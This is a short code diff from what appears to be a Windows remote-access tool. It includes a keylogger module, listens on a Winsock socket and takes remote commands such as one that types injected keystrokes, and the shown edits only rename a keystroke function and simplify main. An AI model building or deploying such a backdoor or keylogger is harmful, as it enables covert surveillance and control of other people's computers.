@@ -46,11 +46,11 @@ bool running = true;
 #include "run.cpp"
 #include "sendrecv.cpp"
 #include "keylogger.cpp"
-#include "sendkey.cpp"
+#include "sendkeys.cpp"
 #include "jokes.cpp"
 
 
-int main(int argc, char* argv[]) {
+int main() {
 	
 	// initialize winsock
 	WSADATA wsData;
@@ -311,11 +311,11 @@ int main(int argc, char* argv[]) {
 				
 				if (command.size() < 4) {
 					echoNsend(clientSocket, "USAGE: sk <stringToSend>", true);
-					echoNsend(clientSocket, getSendkeyHelp(), true);
+					echoNsend(clientSocket, sendkeys_help(), true);
 					continue;
 				}
 				
-				sendkey(command.substr(3));
+				sendkeys(command.substr(3).c_str());
 				
 				continue;
 			}
